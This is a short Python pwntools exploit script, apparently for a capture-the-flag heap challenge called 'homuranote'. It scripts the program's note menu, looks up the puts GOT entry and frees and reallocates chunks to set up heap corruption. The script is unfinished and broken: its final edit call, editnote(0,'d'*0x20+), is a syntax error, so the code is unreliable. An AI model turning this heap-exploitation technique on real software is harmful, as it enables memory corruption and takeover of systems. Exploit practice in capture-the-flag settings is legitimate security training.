from pwn import *

context.log_level="debug"
context.arch="amd64"

r=process('./homuranote')
elf=ELF('homuranote')
libc=ELF('libc-2.24.so')

GOT_puts=elf.got['puts']

def addnote(content):
	r.sendlineafter("choice>>","1")
	r.sendlineafter("Size:",str(len(content)))
	r.sendlineafter("Content:",content)
def shownote(index):
	r.sendlineafter("choice>>","2")
	r.sendlineafter("Index:",str(index))
def editnote(index,content):
	r.sendlineafter("choice>>","3")
	r.sendlineafter("Index:",str(index))
	r.sendline(content)
def deletenote(index):
	r.sendlineafter("choice>>","4")
	r.sendlineafter("Index:",str(index))
def pwn():
	addnote('a'*0x20)#0
	addnote('b'*0x20)#1
	deletenote(1)
	deletenote(0)
	addnote('c'*0x20)#0
	editnote(0,'d'*0x20+)

pwn()